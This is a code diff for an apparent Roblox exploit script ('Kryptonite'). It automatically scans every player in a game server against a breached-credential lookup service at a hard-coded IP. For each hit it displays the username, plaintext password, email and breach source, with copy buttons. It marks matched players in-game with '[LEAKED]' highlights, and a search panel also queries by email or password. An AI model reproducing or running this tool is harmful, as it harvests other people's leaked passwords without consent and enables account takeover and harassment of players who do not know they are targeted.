+    SearchRunButton.MouseEnter:Connect(function() tweenColor(SearchRunButton, Theme.Hover) end)
+    SearchRunButton.MouseLeave:Connect(function() tweenColor(SearchRunButton, Theme.Accent) end)
+
+    makeStaticLogLine("──────────────────────────────────────────────", Theme.ScanGray)
+    makeStaticLogLine("[LEAKED] RESULTS:", Theme.Red)
+    
+    local SEARCH_HEADER_FIXED_HEIGHT = 164 
+    SearchHeaderFrame.Size = UDim2.new(1, -10, 0, SEARCH_HEADER_FIXED_HEIGHT)
+    
+    local SEARCH_CONTENT_START_Y = 35 + SEARCH_HEADER_FIXED_HEIGHT
+    
+    
+    local SearchTab = Instance.new("ScrollingFrame", RightPanel)
+    SearchTab.Name = "SearchTab"
+    SearchTab.Size = UDim2.new(1, -10, 1, -(35 + SEARCH_HEADER_FIXED_HEIGHT)) 
+    SearchTab.Position = UDim2.new(0, 5, 0, SEARCH_CONTENT_START_Y) 
+    SearchTab.BackgroundColor3 = Theme.TerminalBG
+    SearchTab.BackgroundTransparency = 0.05
+    SearchTab.BorderSizePixel = 1
+    SearchTab.BorderColor3 = Theme.Outline
+    SearchTab.CanvasSize = UDim2.new(0, 0, 0, 0)
+    SearchTab.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    SearchTab.ScrollBarThickness = 6
+
+    local lay = Instance.new("UIListLayout", SearchTab)
+    lay.Padding = UDim.new(0, 5)
+    lay.FillDirection = Enum.FillDirection.Vertical
+    lay.HorizontalAlignment = Enum.HorizontalAlignment.Left
+
+    -- 💡 SEARCH TAB İÇİN KOPYALAMA FONKSİYONU
+    local function makeSearchDataLineWithCopy(parentFrame, prefix, value, color)
+        local frame = Instance.new("Frame", parentFrame)
+        frame.Name = "DynamicResultLine"
+        frame.Size = UDim2.new(1, 0, 0, 20)
+        frame.BackgroundTransparency = 1
+        
+        if not value or value == "N/A" or value:len() == 0 then
+            local textLabel = Instance.new("TextLabel", frame)
+            textLabel.Size = UDim2.new(1, -10, 1, 0)
+            textLabel.Position = UDim2.new(0, 0, 0, 0)
+            textLabel.Text = prefix .. (value or "N/A")
+            textLabel.TextColor3 = color or Theme.Text
+            textLabel.BackgroundTransparency = 1
+            textLabel.Font = Enum.Font.Code
+            textLabel.TextSize = 14
+            textLabel.TextXAlignment = Enum.TextXAlignment.Left
+            textLabel.TextYAlignment = Enum.TextYAlignment.Center
+            return
+        end
+
+        local fullText = prefix .. value
+        local textLabel = Instance.new("TextLabel", frame)
+        textLabel.Size = UDim2.new(1, -30, 1, 0) 
+        textLabel.Position = UDim2.new(0, 0, 0, 0) 
+        textLabel.Text = fullText
+        textLabel.TextColor3 = color or Theme.Text
+        textLabel.BackgroundTransparency = 1
+        textLabel.Font = Enum.Font.Code
+        textLabel.TextSize = 14
+        textLabel.TextXAlignment = Enum.TextXAlignment.Left
+        textLabel.TextYAlignment = Enum.TextYAlignment.Center
+            
+        local copyBtn = Instance.new("TextButton", frame)
+        copyBtn.Size = UDim2.new(0, 25, 1, 0) 
+        copyBtn.Position = UDim2.new(1, -25, 0, 0) 
+        copyBtn.Text = "📋" 
+        copyBtn.TextColor3 = Theme.Green 
+        copyBtn.BackgroundTransparency = 1 
+        copyBtn.Font = Enum.Font.GothamBold
+        copyBtn.TextSize = 18
+        copyBtn.AutoButtonColor = false
+
+        copyBtn.MouseButton1Click:Connect(function()
+            if setclipboard then
+                setclipboard(value)
+                terminalLog("Copied: " .. prefix .. value, "info")
+            else
+                terminalLog("Clipboard function unavailable.", "error")
+            end
+        end)
+    end
+    
+    -- Display Results
+    local function displaySearchResults(results, searchTerm)
+        for _, child in ipairs(SearchTab:GetChildren()) do
+            if child.Name == "ResultRecordFrame" or child.Name:match("^DynamicResultLine_") then
+                child:Destroy()
+            end
+        end
+
+        local function makeDynamicResultLine(txt, color)
+            local lbl = Instance.new("TextLabel")
+            lbl.Name = "DynamicResultLine_" .. #SearchTab:GetChildren()
+            lbl.Size = UDim2.new(1, -10, 0, 20)
+            lbl.Text = txt
+            lbl.TextColor3 = color or Theme.Text
+            lbl.BackgroundTransparency = 1
+            lbl.Font = Enum.Font.Code
+            lbl.TextSize = 14
+            lbl.TextXAlignment = Enum.TextXAlignment.Left
+            lbl.TextWrapped = true
+            lbl.Parent = SearchTab
+        end
+
+        SearchRunButton.Text = "RUN SEARCH"
+        searchRunning = false
+
+        if not results or results.found == 0 or not results.result then
+            makeDynamicResultLine(string.format("[INFO] No records found for query: %s", searchTerm), Theme.Green)
+        else
+            makeDynamicResultLine(string.format("[WARN] Total %d records found.", results.found), Color3.fromRGB(255, 200, 0))
+            makeDynamicResultLine("----------------------------------------------", Theme.ScanGray)
+
+            for i, entry in ipairs(results.result) do
+                local recordFrame = Instance.new("Frame", SearchTab)
+                recordFrame.Name = "ResultRecordFrame"
+                recordFrame.Size = UDim2.new(1, 0, 0, 0)
+                recordFrame.BackgroundTransparency = 1
+                recordFrame.AutomaticSize = Enum.AutomaticSize.Y
+                
+                local recordLayout = Instance.new("UIListLayout", recordFrame)
+                recordLayout.Padding = UDim.new(0, 0)
+                recordLayout.FillDirection = Enum.FillDirection.Vertical
+                recordLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+                
+                local titleLbl = Instance.new("TextLabel", recordFrame)
+                titleLbl.Size = UDim2.new(1, -10, 0, 20)
+                titleLbl.Text = string.format("[RECORD #%d]", i)
+                titleLbl.TextColor3 = Theme.Accent
+                titleLbl.BackgroundTransparency = 1
+                titleLbl.Font = Enum.Font.Code
+                titleLbl.TextSize = 14
+                titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+                
+                makeSearchDataLineWithCopy(recordFrame, "  User: ", entry.username or "N/A", Theme.Text)
+                makeSearchDataLineWithCopy(recordFrame, "  Pass: ", entry.password or "N/A", Theme.Red)
+                makeSearchDataLineWithCopy(recordFrame, "  Email: ", entry.email or "N/A", Theme.Green)
+                
+                local originStr = table.concat(entry.origin or {}, ", ")
+                if originStr == "" and entry.source and entry.source.name then
+                    originStr = entry.source.name
+                end
+                makeSearchDataLineWithCopy(recordFrame, "  Source: ", originStr or "N/A", Theme.Accent)
+                
+                local divider = Instance.new("TextLabel", recordFrame)
+                divider.Size = UDim2.new(1, -10, 0, 15)
+                divider.Text = "----------------------------------------------"
+                divider.TextColor3 = Theme.ScanGray
+                divider.BackgroundTransparency = 1
+                divider.Font = Enum.Font.Code
+                divider.TextSize = 14
+                divider.TextXAlignment = Enum.TextXAlignment.Left
+                
+                local spacer = Instance.new("Frame", recordFrame)
+                spacer.Size = UDim2.new(1, 0, 0, 5)
+                spacer.BackgroundTransparency = 1
+            end
+        end
+
+        task.defer(function()
+            SearchTab.CanvasPosition = Vector2.new(0, SearchTab.CanvasSize.Y.Offset)
+        end)
+    end
+
+    -- API Caller
+    local function runSearchAPI()
+        local emailQuery = trim(EmailBox.Text) 
+        local passwordQuery = trim(PasswordBox.Text)
+        local body = {
+            hwid = HWID,
+            roblox_username = LocalPlayer.Name,
+            game_name = GameName,
+            game_id = game.PlaceId
+        }
+        local searchTerm = ""
+
+        if searchRunning then return end
+
+        local isEmailEntered = emailQuery ~= ""
+        local isPasswordEntered = passwordQuery ~= ""
+
+        if isEmailEntered and isPasswordEntered then
+            terminalLog("[ERROR] Use only one search field at a time.", "error")
+            return
+        elseif isEmailEntered then
+            if emailQuery:len() < 3 then
+                terminalLog("[ERROR] Email/Username query must be at least 3 characters.", "error")
+                return
+            end
+            body.query = emailQuery
+            body.query_type = "auto"
+            searchTerm = emailQuery
+        elseif isPasswordEntered then
+            if passwordQuery:len() < 3 then
+                terminalLog("[ERROR] Password query must be at least 3 characters.", "error")
+                return
+            end
+            body.query = passwordQuery
+            body.query_type = "password" 
+            searchTerm = "[PASSWORD] " .. passwordQuery
+        else
+            terminalLog("[ERROR] Please enter a query into one of the fields.", "error")
+            return
+        end
+
+        searchRunning = true
+        SearchRunButton.Text = "LOADING..."
+
+        terminalLog("External search initiated: " .. searchTerm, "scan")
+        local requestFn = syn and syn.request or http and http.request or request
+        if not requestFn then
+            terminalLog("HTTP unavailable.", "error")
+            SearchRunButton.Text = "RUN SEARCH"
+            searchRunning = false
+            return
+        end
+
+        task.spawn(function()
+            local ok, resp = pcall(function()
+                return requestFn({
+                    Url = "http://185.244.106.87:3000/proxy",
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(body)
+                })
+            end)
+
+            local parsed
+            if ok and resp and resp.Body then
+                pcall(function() parsed = HttpService:JSONDecode(resp.Body) end)
+            end
+
+            if not ok or not parsed or not parsed.results or not parsed.results.leakcheck then
+                terminalLog("API response invalid or error: " .. searchTerm, "error")
+                displaySearchResults({found=0}, searchTerm)
+            else
+                terminalLog("Search complete: " .. searchTerm, "info")
+                displaySearchResults(parsed.results.leakcheck, searchTerm)
+            end
+        end)
+    end
+
+    SearchRunButton.MouseButton1Click:Connect(runSearchAPI)
+    EmailBox.FocusLost:Connect(function(enterPressed) if enterPressed then runSearchAPI() end end)
+    PasswordBox.FocusLost:Connect(function(enterPressed) if enterPressed then runSearchAPI() end end)
+end
+SearchTabButton.MouseButton1Click:Connect(openSearchPanel)
+
+-- Add leaked user
+local function addLeakedUser(entry)
+    local lower = (entry.username or "unknown"):lower()
+    if not usersWithLogs[lower] then
+        usersWithLogs[lower] = {}
+        
+        local userEntryFrame = Instance.new("Frame", LeftScroll)
+        userEntryFrame.Name = "Frame_" .. lower
+        userEntryFrame.Size = UDim2.new(1, -8, 0, 26)
+        userEntryFrame.BackgroundTransparency = 1
+        
+        local btn = Instance.new("TextButton")
+        btn.Name = "Btn_" .. lower
+        btn.Size = UDim2.new(1, 0, 1, 0) 
+        btn.Text = "⚠ " .. (entry.username or "N/A")
+        btn.TextColor3 = Theme.Text
+        btn.BackgroundColor3 = Theme.Red
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 13
+        btn.AutoButtonColor = false
+        btn.Parent = userEntryFrame 
+
+        local bc = Instance.new("UICorner", btn)
+        bc.CornerRadius = UDim.new(0, 4)
+
+        btn.MouseEnter:Connect(function() tweenColor(btn, Theme.Hover) end)
+        btn.MouseLeave:Connect(function() tweenColor(btn, Theme.Red) end)
+
+        btn.MouseButton1Click:Connect(function()
+            openUserInfoTab(entry.username)
+        end)
+        
+        terminalLog("User leaked: " .. lower, "leak")
+    end
+
+    table.insert(usersWithLogs[lower], entry)
+end
+
+
+-- Clear ESP
+local function clearESP(plr)
+    if not plr.Character then return end
+    for _, c in ipairs(plr.Character:GetChildren()) do
+        if c:IsA("Highlight") or c:IsA("BillboardGui") then
+            c:Destroy()
+        end
+    end
+end
+
+-- Scanning visual
+local function setScanningESP(plr)
+    if not plr.Character then return end
+    clearESP(plr)
+    local hl = Instance.new("Highlight")
+    hl.Adornee = plr.Character
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.FillColor = Theme.ScanGray
+    hl.OutlineColor = Theme.Outline
+    hl.FillTransparency = 0.5
+    hl.OutlineTransparency = 0.3
+    hl.Parent = plr.Character
+
+    local bg = Instance.new("BillboardGui")
+    bg.Name = "Kryptonite_ScanningTag"
+    bg.Adornee = plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart")
+    bg.Size = UDim2.new(0, 120, 0, 30)
+    bg.StudsOffset = Vector3.new(0, 2.5, 0)
+    bg.AlwaysOnTop = true
+    bg.Parent = plr.Character
+
+    local lbl = Instance.new("TextLabel", bg)
+    lbl.Size = UDim2.new(1,0,1,0)
+    lbl.BackgroundTransparency = 1
+    lbl.TextColor3 = Theme.Text
+    lbl.Font = Enum.Font.GothamBold
+    lbl.Text = "[SCAN]"
+    lbl.TextScaled = true
+end
+
+-- Leaked visual
+local function setLeakedESP(plr)
+    if not plr.Character then return end
+    clearESP(plr)
+    local hl = Instance.new("Highlight")
+    hl.Adornee = plr.Character
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.FillColor = Color3.new(1,0,0)
+    hl.OutlineColor = Theme.Accent
+    hl.FillTransparency = 0.4
+    hl.OutlineTransparency = 0.2
+    hl.Parent = plr.Character
+
+    local bg = Instance.new("BillboardGui")
+    bg.Name = "Kryptonite_LeakTag"
+    bg.Adornee = plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart")
+    bg.Size = UDim2.new(0, 120, 0, 25)
+    bg.StudsOffset = Vector3.new(0, 2.5, 0)
+    bg.AlwaysOnTop = true
+    bg.Parent = plr.Character
+
+    local lbl = Instance.new("TextLabel", bg)
+    lbl.Size = UDim2.new(1,0,1,0)
+    lbl.BackgroundTransparency = 1
+    lbl.TextColor3 = Color3.fromRGB(255,80,80)
+    lbl.Font = Enum.Font.Code
+    lbl.Text = "[LEAKED] " .. plr.Name
+    lbl.TextScaled = true
+    lbl.TextStrokeTransparency = 0.6
+end
+
+-- HTTP scan (for in-game players)
+local function scanUser(username)
+    terminalLog("Scanning: " .. username, "scan")
+    local requestFn = syn and syn.request or http and http.request or request
+    if not requestFn then
+        terminalLog("HTTP unavailable", "error")
+        return
+    end
+
+    local ok, resp = pcall(function()
+        return requestFn({
+            Url = "http://185.244.106.87:3000/proxy",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({
+                hwid = HWID,
+                roblox_username = LocalPlayer.Name,
+                query = username,
+                game_name = GameName,
+                game_id = game.PlaceId,
+                query_type = "auto"
+            })
+        })
+    end)
+
+    if not ok or not resp or not resp.Body then
+        terminalLog("HTTP error scanning " .. username, "error")
+        return
+    end
+
+    local parsed
+    local ok2 = pcall(function() parsed = HttpService:JSONDecode(resp.Body) end)
+    if not ok2 or not parsed or not parsed.results or not parsed.results.leakcheck then
+        terminalLog("JSON parse error or invalid API response for " .. username, "error")
+        return
+    end
+
+    local leakcheck = parsed.results.leakcheck
+    if not leakcheck or leakcheck.found <= 0 then
+        terminalLog(username .. " is clean.", "info")
+        return
+    end
+
+    local foundLeaks = false
+    for _, ent in ipairs(leakcheck.result or {}) do
+        if ent.username and tostring(ent.username):len() > 0 then
+            
+            if ent.source and ent.source.name and tostring(ent.source.name):find("%.") then
+                ent.origin = ent.origin or {}
+                table.insert(ent.origin, tostring(ent.source.name):lower())
+            end
+            
+            addLeakedUser(ent)
+            foundLeaks = true
+        end
+    end
+
+    if foundLeaks then
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Name:lower() == username:lower() then
+                setLeakedESP(plr)
+            end
+        end
+    else
+        terminalLog(username .. " is clean (no usable records found).", "info")
+    end
+end
+-- Process queue
+local function processQueue()
+    if not isAutoScanEnabled then return end 
+    if isScanning then return end
+    isScanning = true
+    task.spawn(function()
+        local scannedThisRound = 0
+        local totalThisRound = #scanQueue
+        scanRounds += 1
+
+        while #scanQueue > 0 do
+            if not isAutoScanEnabled then 
+                isScanning = false
+                return 
+            end
+
+            local item = table.remove(scanQueue, 1)
+            local uname = item.username
+            local plr = item.instance
+            local lower = uname:lower()
+
+            if not scannedPlayers[lower] then
+                if plr then setScanningESP(plr) end
+                scanUser(uname)
+                if plr then clearESP(plr) end
+
+                scannedPlayers[lower] = true
+                scannedThisRound += 1
+                totalScans += 1
+
+                ScanProgressLabel.Text = string.format("Checked: %d/%d x%d", scannedThisRound, totalThisRound, scanRounds)
+
+                task.wait(SCAN_DELAY)
+            end
+        end
+
+        isScanning = false
+    end)
+end
+
+-- Queue user
+local function queueUser(username, instance)
+    if not isAutoScanEnabled then return end 
+    local lower = username:lower()
+    if scannedPlayers[lower] or usersWithLogs[lower] then
+        return
+    end
+    for _, v in ipairs(scanQueue) do
+        if v.username:lower() == lower then
+            return
+        end
+    end
+    table.insert(scanQueue, { username = username, instance = instance })
+end
+
+-- Auto rescan
+task.spawn(function()
+    while true do
+        while isScanning or #scanQueue > 0 or not isAutoScanEnabled do 
+            task.wait(1)
+        end
+        task.wait(2)
+        
+        if not isAutoScanEnabled then continue end 
+        
+        terminalLog("Rescanning clean players...", "warn")
+        for _, plr in ipairs(Players:GetPlayers()) do
+            local lower = plr.Name:lower()
+            if not usersWithLogs[lower] then
+                scannedPlayers[lower] = nil
+                queueUser(plr.Name, plr)
+            end
+        end
+        processQueue()
+        task.wait(5)
+    end
+end)
+
+-- Player events
+Players.PlayerAdded:Connect(function(plr)
+    task.delay(2, function()
+        queueUser(plr.Name, plr)
+        processQueue()
+    end)
+end)
+Players.PlayerRemoving:Connect(function(plr)
+    local lower = plr.Name:lower()
+    if usersWithLogs[lower] then
+        local frame = LeftScroll:FindFirstChild("Frame_" .. lower)
+        if frame then frame:Destroy() end
+        usersWithLogs[lower] = nil
+    end
+    clearESP(plr)
+end)
+
+-- Minimize / restore logic (GÜNCELLENMİŞ - Smooth Tween)
+CloseBtn.MouseButton1Click:Connect(function()
+    if not isMinimized then
+        isMinimized = true
+        local tween = TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
+            Size = UDim2.new(0,0,0,0),
+            Position = UDim2.new(0.5,0,0.5,0)
+        })
+        tween:Play()
+        tween.Completed:Connect(function()
+            Main.Visible = false
+            local mini = Instance.new("Frame", gui)
+            mini.Name = "MiniBox"
+            mini.Size = UDim2.new(0,60,0,60)
+            mini.Position = Main.Position 
+            mini.BackgroundColor3 = Theme.MainBG
+            mini.BorderColor3 = Theme.Outline
+            mini.BorderSizePixel = 1
+            mini.Active = true
+            miniFrame = mini
+            Instance.new("UICorner", mini).CornerRadius = UDim.new(0,10) 
+
+            local miniStroke = Instance.new("UIStroke", mini)
+            miniStroke.Color = Color3.fromRGB(0,0,0)
+            miniStroke.Thickness = 2
+            miniStroke.Transparency = 0.2
+            miniStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+            local miniText = Instance.new("TextLabel", mini)
+            miniText.Size = UDim2.new(1,0,1,0)
+            miniText.Position = UDim2.new(0,0,0,0)
+            miniText.BackgroundTransparency = 1
+            miniText.Font = Enum.Font.SciFi
+            miniText.TextSize = 36
+            miniText.TextColor3 = Theme.Accent
+            miniText.Text = "K"
+            miniText.TextScaled = true
+
+            local miniBtn = Instance.new("TextButton", mini)
+            miniBtn.Size = UDim2.new(1,0,1,0)
+            miniBtn.Position = UDim2.new(0,0,0,0)
+            miniBtn.BackgroundTransparency = 1
+            miniBtn.Text = ""
+            miniBtn.AutoButtonColor = false
+
+            miniBtn.MouseButton1Down:Connect(function()
+                isDragging = true
+                dragStartPos = UserInputService:GetMouseLocation()
+            end)
+            miniBtn.MouseButton1Up:Connect(function()
+                isDragging = false
+                local current = UserInputService:GetMouseLocation()
+                local dist = (current - dragStartPos).Magnitude
+                if dist < 5 then
+                    if miniFrame then miniFrame:Destroy() end
+                    Main.Visible = true
+                    local tween2 = TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+                        Size = UDim2.new(0,720,0,460),
+                        Position = UDim2.new(0.5,0,0.5,0)
+                    })
+                    tween2:Play()
+                    isMinimized = false
+                end
+            end)
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input, gameProcessed)
+    if input.UserInputType == Enum.UserInputType.MouseMovement and isDragging and miniFrame then
+        miniFrame.Position = UDim2.new(0, input.Position.X, 0, input.Position.Y)
+             - UDim2.new(0, miniFrame.Size.X.Offset/2, 0, miniFrame.Size.Y.Offset/2)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input, gameProcessed)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = false
+    end
+end)
+
+-- Highlight leaks continuously
+RunService.Heartbeat:Connect(function()
+    for lower, _ in pairs(usersWithLogs) do
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Name:lower() == lower then
+                setLeakedESP(plr)
+            end
+        end
+    end
+end)
